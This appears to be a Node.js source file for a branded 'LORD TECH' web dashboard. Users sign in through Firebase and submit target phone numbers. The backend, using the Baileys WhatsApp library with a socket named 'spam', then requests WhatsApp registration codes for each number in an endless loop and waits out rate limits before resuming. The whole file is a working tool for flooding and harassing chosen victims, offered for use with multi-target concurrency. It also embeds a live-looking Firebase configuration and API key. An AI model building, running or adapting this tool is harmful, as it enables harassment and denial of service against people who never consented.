const gradient = require('gradient-string');
const pino = require('pino');
const fs = require('fs');
const { exec } = require('child_process');
const { default: makeWaSocket, useMultiFileAuthState } = require('@whiskeysockets/baileys');
const http = require('http');

// Setup directory storage
if (!fs.existsSync('./files')) fs.mkdirSync('./files');

const color = (text, colors) => {
    try { return gradient(colors)(text); } catch (e) { return text; }
};

// --- MASTER Banner ---
const masterBanner = `
${color(' ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ', ['#00F2FE', '#4FACFE'])}
${color(' ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
${color(' ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝', ['#00F2FE', '#4FACFE'])}
${color(' ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔════╝██╔══██╗', ['#00F2FE', '#4FACFE'])}
${color(' ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║', ['#00F2FE', '#4FACFE'])}
${color(' ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝', ['#00F2FE', '#4FACFE'])}
`;

// Glassmorphism & High-End Dashboard HTML
const dashboardHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LORD TECH | Executive Operations Dashboard</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --bg-color: #0b0f19;
            --card-bg: rgba(18, 26, 43, 0.75);
            --border-color: rgba(255, 255, 255, 0.1);
            --accent-blue: #00f2fe;
            --accent-gradient: linear-gradient(135deg, #00f2fe 0%, #4facfe 100%);
            --text-main: #f3f4f6;
            --text-sub: #9ca3af;
        }

        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: 'Inter', sans-serif;
        }

        body {
            background-color: var(--bg-color);
            background-image: 
                radial-gradient(circle at 15% 15%, rgba(0, 242, 254, 0.08) 0%, transparent 40%),
                radial-gradient(circle at 85% 85%, rgba(79, 172, 254, 0.08) 0%, transparent 40%);
            color: var(--text-main);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .wrapper {
            width: 100%;
            max-width: 900px;
        }

        .auth-container, .dashboard-container {
            background: var(--card-bg);
            backdrop-filter: blur(16px);
            -webkit-backdrop-filter: blur(16px);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            padding: 40px;
            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
        }

        .header {
            text-align: center;
            margin-bottom: 30px;
        }

        .header h1 {
            font-size: 28px;
            font-weight: 700;
            letter-spacing: 1px;
            background: var(--accent-gradient);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .header p {
            color: var(--text-sub);
            font-size: 14px;
            margin-top: 5px;
        }

        .creator-tag {
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 2px;
            color: var(--accent-blue);
            margin-bottom: 8px;
            font-weight: 600;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            font-size: 12px;
            color: var(--text-sub);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        input {
            width: 100%;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            color: #fff;
            font-size: 14px;
            outline: none;
            transition: all 0.3s ease;
        }

        input:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 10px rgba(0, 242, 254, 0.2);
        }

        .btn {
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 8px;
            background: var(--accent-gradient);
            color: #000;
            font-weight: 700;
            cursor: pointer;
            text-transform: uppercase;
            letter-spacing: 1px;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0, 242, 254, 0.3);
        }

        .auth-toggle {
            text-align: center;
            margin-top: 20px;
            font-size: 13px;
            color: var(--text-sub);
        }

        .auth-toggle span {
            color: var(--accent-blue);
            cursor: pointer;
            font-weight: 600;
        }

        /* Dashboard Top Bar */
        .dash-nav {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid var(--border-color);
        }

        .user-info {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .avatar {
            width: 36px;
            height: 36px;
            border-radius: 50%;
            background: var(--accent-gradient);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: bold;
        }

        .btn-logout {
            background: rgba(255, 255, 255, 0.1);
            color: #fff;
            padding: 8px 16px;
            border-radius: 6px;
            border: none;
            cursor: pointer;
            font-size: 12px;
        }

        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }

        @media (max-width: 768px) {
            .grid { grid-template-columns: 1fr; }
        }

        .table-container {
            margin-top: 25px;
            background: rgba(0, 0, 0, 0.2);
            border-radius: 8px;
            border: 1px solid var(--border-color);
            overflow: hidden;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            text-align: left;
            font-size: 13px;
        }

        th, td {
            padding: 12px 16px;
            border-bottom: 1px solid var(--border-color);
        }

        th {
            background: rgba(255, 255, 255, 0.02);
            color: var(--text-sub);
            font-weight: 600;
        }

        .status-badge {
            display: inline-block;
            padding: 4px 8px;
            border-radius: 4px;
            font-size: 11px;
            font-weight: 600;
            background: rgba(0, 255, 136, 0.1);
            color: #00ff88;
        }

        .hidden { display: none; }
    </style>
</head>
<body>

<div class="wrapper">
    <!-- AUTHENTICATION CARD -->
    <div id="authCard" class="auth-container">
        <div class="header">
            <div class="creator-tag">Creator Lord Tech</div>
            <h1 id="authTitle">AUTHENTICATION</h1>
            <p>Access the control system</p>
        </div>
        <form id="authForm">
            <div class="form-group">
                <label>Email Address</label>
                <input type="email" id="authEmail" placeholder="admin@lordtech.com" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <input type="password" id="authPassword" placeholder="••••••••" required>
            </div>
            <button type="submit" id="authBtn" class="btn">Sign In</button>
        </form>
        <div class="auth-toggle">
            <span id="toggleText">Need an account? Sign Up</span>
        </div>
    </div>

    <!-- MAIN DASHBOARD CARD -->
    <div id="dashCard" class="dashboard-container hidden">
        <div class="dash-nav">
            <div class="user-info">
                <div class="avatar" id="userAvatar">U</div>
                <div>
                    <div style="font-weight: 600; font-size: 14px;" id="userEmail">user@domain.com</div>
                    <div style="font-size: 11px; color: var(--accent-blue);">Creator Lord Tech Platform</div>
                </div>
            </div>
            <button class="btn-logout" id="logoutBtn"><i class="fa-solid font-awesome"></i> Log Out</button>
        </div>

        <div class="grid">
            <div>
                <h3 style="margin-bottom: 15px; font-size: 16px;">Deploy Target Number</h3>
                <form id="targetForm">
                    <div class="form-group">
                        <label>Country Code</label>
                        <input type="text" id="ddi" placeholder="92" required>
                    </div>
                    <div class="form-group">
                        <label>Phone Number</label>
                        <input type="text" id="number" placeholder="3001234567" required>
                    </div>
                    <button type="submit" class="btn">Start Task</button>
                </form>
            </div>

            <div>
                <h3 style="margin-bottom: 15px; font-size: 16px;">Active Tasks</h3>
                <div class="table-container">
                    <table>
                        <thead>
                            <tr>
                                <th>Target</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody id="numberTable">
                            <tr>
                                <td colspan="2" style="text-align:center; color: var(--text-sub);">No active tasks running</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Firebase Modular SDK -->
<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
    import { 
        getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, 
        onAuthStateChanged, signOut 
    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
    import { 
        getDatabase, ref, push, onValue 
    } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

    // Firebase Credentials Config
    const firebaseConfig = {
      apiKey: "AIzaSyCnLPPrYUgadNSpvCtOpY5-hxR-Oj9VRR4",
      authDomain: "botttt-90f17.firebaseapp.com",
      databaseURL: "https://botttt-90f17-default-rtdb.firebaseio.com",
      projectId: "botttt-90f17",
      storageBucket: "botttt-90f17.firebasestorage.app",
      messagingSenderId: "81533093740",
      appId: "1:81533093740:web:c538860b9245caa8d25549"
    };

    const app = initializeApp(firebaseConfig);
    const auth = getAuth(app);
    const db = getDatabase(app);

    let currentUser = null;
    let isSignUp = false;

    // Toggle Sign In / Sign Up modes
    document.getElementById('toggleText').addEventListener('click', () => {
        isSignUp = !isSignUp;
        document.getElementById('authTitle').innerText = isSignUp ? "CREATE ACCOUNT" : "AUTHENTICATION";
        document.getElementById('authBtn').innerText = isSignUp ? "Sign Up" : "Sign In";
        document.getElementById('toggleText').innerText = isSignUp ? "Already have an account? Sign In" : "Need an account? Sign Up";
    });

    // Auth Form Submit
    document.getElementById('authForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const email = document.getElementById('authEmail').value;
        const pass = document.getElementById('authPassword').value;

        try {
            if (isSignUp) {
                await createUserWithEmailAndPassword(auth, email, pass);
            } else {
                await signInWithEmailAndPassword(auth, email, pass);
            }
        } catch (err) {
            alert(err.message);
        }
    });

    // Sign Out
    document.getElementById('logoutBtn').addEventListener('click', () => signOut(auth));

    // Auth State Tracking
    onAuthStateChanged(auth, (user) => {
        currentUser = user;
        if (user) {
            document.getElementById('authCard').classList.add('hidden');
            document.getElementById('dashCard').classList.remove('hidden');
            document.getElementById('userEmail').innerText = user.email;
            document.getElementById('userAvatar').innerText = user.email[0].toUpperCase();
            
            // Listen for user targets in Firebase Realtime Database
            const userTargetsRef = ref(db, 'users/' + user.uid + '/targets');
            onValue(userTargetsRef, (snapshot) => {
                const data = snapshot.val();
                const tbody = document.getElementById('numberTable');
                tbody.innerHTML = '';

                if (data) {
                    Object.values(data).forEach(item => {
                        const tr = document.createElement('tr');
                        tr.innerHTML = \`
                            <td>+\${item.ddi}\${item.number}</td>
                            <td><span class="status-badge">ACTIVE</span></td>
                        \`;
                        tbody.appendChild(tr);
                    });
                } else {
                    tbody.innerHTML = '<tr><td colspan="2" style="text-align:center; color: var(--text-sub);">No active tasks running</td></tr>';
                }
            });

        } else {
            document.getElementById('authCard').classList.remove('hidden');
            document.getElementById('dashCard').classList.add('hidden');
        }
    });

    // Deployment Form Submit
    document.getElementById('targetForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        const ddi = document.getElementById('ddi').value.trim();
        const number = document.getElementById('number').value.trim();

        if (!currentUser) return;

        // Save Target to Firebase Realtime DB under User Node
        const userTargetsRef = ref(db, 'users/' + currentUser.uid + '/targets');
        await push(userTargetsRef, {
            ddi: ddi,
            number: number,
            timestamp: Date.now()
        });

        // Trigger Node.js backend task
        try {
            await fetch('/start', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ ddi, number, uid: currentUser.uid })
            });
            document.getElementById('ddi').value = '';
            document.getElementById('number').value = '';
        } catch (err) {
            alert('Failed connecting to server endpoint.');
        }
    });
</script>
</body>
</html>
`;

const start = async () => {
    console.clear(); 

    const mainChannel = 'https://whatsapp.com/channel/0029Va75f6BIXnlq8eZxTy2M';
    const openCmd = process.platform === 'win32' ? `start ${mainChannel}` : `termux-open-url ${mainChannel} || xdg-open ${mainChannel}`;

    exec(openCmd);

    console.log(masterBanner);
    console.log(color('╔════════════════════════════════════════════╗', ['#00F2FE', '#4FACFE']));
    console.log(color('║       👑 CREATOR: LORD TECH 👑              ║', ['#FFFFFF', '#00F2FE']));
    console.log(color('║       🛡️ SYSTEM  : EXECUTIVE DASHBOARD      ║', ['#00FFFF', '#0000FF']));
    console.log(color('╚════════════════════════════════════════════╝', ['#00F2FE', '#4FACFE']));

    const { state } = await useMultiFileAuthState('.auth_session');

    const spam = makeWaSocket({
        auth: state,
        mobile: true,
        logger: pino({ level: 'silent' })
    });

    const dropNumber = async (context) => {
        const { ddi, number, phoneNumber } = context;
        while (true) {
            try {
                const res = await spam.requestRegistrationCode({
                    phoneNumber: '+' + phoneNumber,
                    phoneNumberCountryCode: ddi,
                    phoneNumberNationalNumber: number,
                    phoneNumberMobileCountryCode: 724
                });

                if (res.reason === 'temporarily_unavailable') {
                    console.log(color(`[!] LIMIT REACHED (+${phoneNumber})! RETRY IN: ${res.retry_after}s`, ['#FF4500', '#FF0000']));
                    await new Promise(r => setTimeout(r, res.retry_after * 1000));
                }
            } catch (e) {
                await new Promise(r => setTimeout(r, 2000));
            }
        }
    };

    // HTTP Server handling frontend and multi-target launches
    const server = http.createServer((req, res) => {
        if (req.method === 'GET' && req.url === '/') {
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(dashboardHTML);
        } else if (req.method === 'POST' && req.url === '/start') {
            let body = '';
            req.on('data', chunk => body += chunk.toString());
            req.on('end', () => {
                const data = JSON.parse(body);
                
                // Spawn target loop independently so multiple numbers run concurrently
                dropNumber({ 
                    ddi: data.ddi, 
                    number: data.number, 
                    phoneNumber: data.ddi + data.number 
                });
                
                res.writeHead(200, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ message: `Target +${data.ddi}${data.number} initiated.` }));
            });
        } else {
            res.writeHead(404);
            res.end();
        }
    });

    server.listen(3000, () => {
        console.log(color('\n ► LORD TECH CONTROL PANEL ACTIVE: http://localhost:3000', ['#00FF00', '#FFFFFF']));
    });
};

start();
